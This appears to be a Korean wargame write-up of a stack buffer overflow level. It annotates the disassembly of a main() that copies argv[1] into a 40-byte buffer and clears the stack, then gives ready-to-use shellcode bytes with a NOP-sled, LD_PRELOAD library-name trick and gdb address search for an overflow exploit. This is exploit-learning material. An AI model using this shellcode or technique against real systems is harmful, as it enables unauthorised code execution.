0x8048470 <main>:       push   %ebp
0x8048471 <main+1>:     mov    %ebp,%esp
0x8048473 <main+3>:     sub    %esp,44
-main() 프롤로그

0x8048476 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804847a <main+10>:    jg     0x8048493 <main+35>

0x804847c <main+12>:    push   0x8048570
0x8048481 <main+17>:    call   0x8048378 <printf>
0x8048486 <main+22>:    add    %esp,4

0x8048489 <main+25>:    push   0
0x804848b <main+27>:    call   0x8048388 <exit>
0x8048490 <main+32>:    add    %esp,4
----------------
if(argc<=1){
	printf("[0x8048570]");
	exit(0)
}
----------------
0x8048493 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048496 <main+38>:    add    %eax,4
0x8048499 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804849b <main+43>:    add    %edx,47
0x804849e <main+46>:    cmp    BYTE PTR [%edx],0xbf
0x80484a1 <main+49>:    je     0x80484c0 <main+80>

0x80484a3 <main+51>:    push   0x804857c
0x80484a8 <main+56>:    call   0x8048378 <printf>
0x80484ad <main+61>:    add    %esp,4

0x80484b0 <main+64>:    push   0
0x80484b2 <main+66>:    call   0x8048388 <exit>
0x80484b7 <main+71>:    add    %esp,4
------------------------
if(argv[1][47] != "\xbf"){
	printf("[0x804857c]");
	exit(0);
}
------------------------
0x80484ba <main+74>:    lea    %esi,[%esi]
0x80484c0 <main+80>:    mov    %eax,DWORD PTR [%ebp+12]
0x80484c3 <main+83>:    add    %eax,4
0x80484c6 <main+86>:    mov    %edx,DWORD PTR [%eax]
0x80484c8 <main+88>:    push   %edx
0x80484c9 <main+89>:    lea    %eax,[%ebp-40]
0x80484cc <main+92>:    push   %eax
0x80484cd <main+93>:    call   0x80483a8 <strcpy>
0x80484d2 <main+98>:    add    %esp,8
--------------------------
strcpy([%ebp-40], argv[1]);
--------------------------
0x80484d5 <main+101>:   lea    %eax,[%ebp-40]
0x80484d8 <main+104>:   push   %eax
0x80484d9 <main+105>:   push   0x8048599
0x80484de <main+110>:   call   0x8048378 <printf>
0x80484e3 <main+115>:   add    %esp,8
-------------------------
printf("[0x8048599]",[%ebp-40]);
-------------------------
0x80484e6 <main+118>:   push   44
0x80484e8 <main+120>:   push   0
0x80484ea <main+122>:   lea    %eax,[%ebp-40]
0x80484ed <main+125>:   push   %eax
0x80484ee <main+126>:   call   0x8048398 <memset>
0x80484f3 <main+131>:   add    %esp,12
-------------------------
memset([%ebp-40],0,44);	-> SFP값까지 삭제
-------------------------
0x80484f6 <main+134>:   lea    %eax,[%ebp-40]
0x80484f9 <main+137>:   mov    %edx,0xbfffffcf
0x80484fe <main+142>:   mov    %ecx,%edx
0x8048500 <main+144>:   sub    %ecx,%eax
0x8048502 <main+146>:   mov    %eax,%ecx
0x8048504 <main+148>:   push   %eax
-> [0xbfffffcf]-[%ebp-40]을 push

0x8048505 <main+149>:   push   0
-> 0 push
0x8048507 <main+151>:   lea    %eax,[%ebp-40]
0x804850a <main+154>:   lea    %edx,[%eax+48]
0x804850d <main+157>:   push   %edx
-> DWORD PTR([%ebp-40]+48)을 push
0x804850e <main+158>:   call   0x8048398 <memset>
0x8048513 <main+163>:   add    %esp,12
----------------------------------
memset([%ebp-40]+48, 0, [0xbfffffcf]-[%ebp-40]);

*[0xbfffffcf]는 스택 최상위인 0xffffffff-0x48이다.
 경험상 어셈블리어에서 같은 식 내에서의 정수의 계산은 미리 후딱해버리는 경향이 있기 때문에
 [0xbfffffcf]-[%ebp-40] 는 [0xffffffff] - [%ebp-40] - 48일 것이다.
	-> 이러면 argc부분(RET 바로 위) 부터 모든 stack이 0으로 초기화됨.
----------------------------------
0x8048516 <main+166>:   leave
0x8048517 <main+167>:   ret
- main함수 종료
0x8048518 <main+168>:   nop
0x8048519 <main+169>:   nop

-> 변수는 [%ebp-40] 하나인듯. printf()문을 보아, 문자열일 가능성이 높음.
------------------------------------------------

[페이로드 작성]
사용 쉘(NONE "\x2f"):
\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81

1.  LD_PRELOAD에 들어갈 공유 라이브러리 실행파일 제작
	-> 특별한 용도없는 c코드를 제작
	-> 해당 c코드를 gcc로 디버깅.
		사용 옵션:
			-fPIC(Position-Indipendent Code) : 실행파일을 동적 라이브러리로 사용하겠다는 옵션
			-shared : 공유 라이브러리로 하겠다는 옵션

gcc -fPIC -shared ./test.c -o `perl -e'print "\x90"x100,"[쉘코드]"'`

2. LD_PRELOAD 설정
	1) pwd 명령어로 현재 디렉토리의 절대 경로 알기
	2) export명령어로 1에서 제작한 공유 라이브러리 실행파일의 절대경로를 LD_PRELOAD로 저장.

3. gdb 후 x/1500x $esp-1500 이정도? 로 해서 stack아래에 있는 공유 라이브러리 메모리에 있는 쉘코드의 주소 알아내기 

-> BOF로 페이로드 삽입.




